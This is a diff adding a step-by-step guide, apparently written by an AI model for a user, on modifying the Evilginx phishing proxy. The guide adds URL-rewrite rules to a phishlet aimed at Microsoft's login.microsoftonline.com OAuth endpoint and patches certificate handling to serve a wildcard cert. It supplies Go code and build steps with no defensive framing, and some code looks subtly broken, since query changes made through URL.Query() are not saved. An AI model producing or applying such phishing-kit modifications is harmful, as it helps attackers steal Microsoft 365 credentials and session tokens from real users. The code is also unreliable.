@@ -1,0 +1,146 @@
+# Evilginx URL Rewrite Mod: Step-by-Step Guide
+
+This guide walks you through modifying the community version of Evilginx to support advanced URL rewriting using phishlet YAML configuration. It includes context from your previous prompts, the edits made, and troubleshooting steps for common problems.
+
+---
+
+## 1. Clone the Community Version of Evilginx
+
+```sh
+git clone https://github.com/kgretzky/evilginx2.git
+cd evilginx2
+```
+
+## 2. Project Structure Overview
+
+- `main.go`: Entry point, CLI, orchestrator
+- `core/`: Main logic (proxy, phishlet parsing, session, utils)
+  - `http_proxy.go`: HTTP(S) proxy logic, request/response rewriting
+  - `phishlet.go`: Phishlet config parsing, Go struct mapping
+  - `config.go`, `session.go`, `utils.go`: Config, session, helpers
+- `phishlets/`: YAML files for site-specific logic
+
+## 3. Add/Modify Phishlet YAML for URL Rewrite
+
+Edit or create a phishlet YAML (e.g., `phishlets/o365.yaml`).
+
+```yaml
+rewrite_urls:
+  - trigger:
+      domains: ['login.microsoftonline.com']
+      paths: ['/common/oauth2/v2.0/authorize']
+    rewrite:
+      path: '/oauth'
+      query:
+        - key: 'tid'
+          value: '{id}'
+```
+
+## 4. Map New YAML Fields in Go Structs
+
+Edit `core/phishlet.go` to add explicit mapping for the new `rewrite_urls` field:
+
+**Add the following struct definition after the last phishlet config struct (for example, after `type ConfigPhishlet struct { ... }`):**
+
+```go
+// Add this after the last phishlet config struct
+type RewriteURL struct {
+    Trigger struct {
+        Domains []string `yaml:"domains"`
+        Paths   []string `yaml:"paths"`
+    } `yaml:"trigger"`
+    Rewrite struct {
+        Path  string `yaml:"path"`
+        Query []struct {
+            Key   string `yaml:"key"`
+            Value string `yaml:"value"`
+        } `yaml:"query"`
+    } `yaml:"rewrite"`
+}
+```
+
+**In `type ConfigPhishlet struct`, add the following field after the last field in the struct:**
+
+```go
+    RewriteURLs []RewriteURL `yaml:"rewrite_urls"`
+```
+
+**In the `LoadFromFile` function, after the line where the YAML is unmarshaled into `ConfigPhishlet`, ensure `rewrite_urls` is included.**
+For example, add a check or log after the `yaml.Unmarshal` call to confirm the field is loaded.
+
+## 5. Implement Rewrite Logic in Proxy
+
+Edit `core/http_proxy.go` to process rewrite rules during request handling:
+
+**Find the main proxy handler function (for example, `func handleProxyRequest(...)`). Add the following code after the line where the request object is created or received, but before the request is forwarded to the target server:**
+
+```go
+// Add this after the request object is available, before forwarding
+for _, rule := range phishlet.RewriteURLs {
+    // Match host and path
+    if stringInSlice(request.Host, rule.Trigger.Domains) && stringInSlice(request.URL.Path, rule.Trigger.Paths) {
+        request.URL.Path = rule.Rewrite.Path
+        for _, q := range rule.Rewrite.Query {
+            request.URL.Query().Set(q.Key, q.Value)
+        }
+    }
+}
+```
+
+Replace `stringInSlice` with your preferred helper for matching strings in slices, or use an existing utility function. Add this code after the request is parsed but before any logic that sends the request to the destination server.
+
+## 6. Troubleshooting & Common Problems
+
+- **YAML Parsing Errors:**
+  - Ensure all new fields are explicitly mapped in Go structs.
+  - Use descriptive error messages in `phishlet.go`.
+- **Rewrite Not Working:**
+  - Confirm the phishlet YAML is loaded and the rules are parsed.
+  - Add debug logs in `http_proxy.go` to verify rule matching.
+- **Certificate Issues:**
+  - Evilginx requires valid TLS certs for proxying. Use Cloudflare Origin Certificates for wildcard domains.
+  - Patch `core/config.go` and `core/http_server.go` to always use the wildcard cert for all hostnames if needed.
+
+## 7. Example: Certificate Patch (if needed)
+
+In `core/config.go`, find the certificate loading logic (for example, `func GetCertificateForHost(host string)`). Add the following code after the function signature, replacing the existing logic:
+
+```go
+// config.go
+// Add this after the function signature for GetCertificateForHost
+func GetCertificateForHost(host string) (*tls.Certificate, error) {
+    // Always return the wildcard cert
+    return wildcardCert, nil
+}
+```
+
+In `core/http_server.go`, ensure the TLS server uses this function for all hostnames. For example, after the line where the certificate is loaded for a specific host, replace it with a call to `GetCertificateForHost` for every hostname.
+
+## 8. Build and Run
+
+On Windows:
+```sh
+build.bat
+build_run.bat
+```
+On Linux:
+```sh
+make
+sudo ./evilginx
+```
+
+## 9. Validate Functionality
+
+- Test with your phishlet and verify URL rewriting works as expected.
+- Use debug logs to confirm rewrite logic is triggered.
+
+---
+
+## References
+- [Official Evilginx Documentation](https://help.evilginx.com)
+- [Evilginx Mastery Course](https://academy.breakdev.org/evilginx-mastery)
+- [Project README](README.md)
+
+---
+
+This guide summarizes the workflow, code changes, and troubleshooting steps for adding URL rewrite functionality to Evilginx using phishlet YAML configuration.
